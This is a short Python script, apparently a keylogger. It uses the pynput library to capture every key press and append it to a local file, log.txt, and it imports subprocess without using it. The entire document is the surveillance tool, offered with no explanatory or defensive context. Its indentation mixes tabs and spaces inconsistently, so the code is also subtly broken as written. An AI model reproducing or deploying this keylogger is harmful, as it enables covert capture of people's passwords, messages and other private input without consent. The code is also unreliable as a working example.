from subprocess import *
from pynput.keyboard import Listener 

def logger(key):
	temp = str(key)
	temp = temp.replace("'", "")

	if temp == 'Key.space':
        temp = ' '
    if temp == 'Key.shift_r':
        temp = ''
    if temp == "Key.ctrl_l":
        temp = ""
    if temp == "Key.enter":
        temp = "\n"	

	with open('log.txt','a' ) as log:
		log.write(temp)

with Listener(on_press=logger) as listener:listener.join()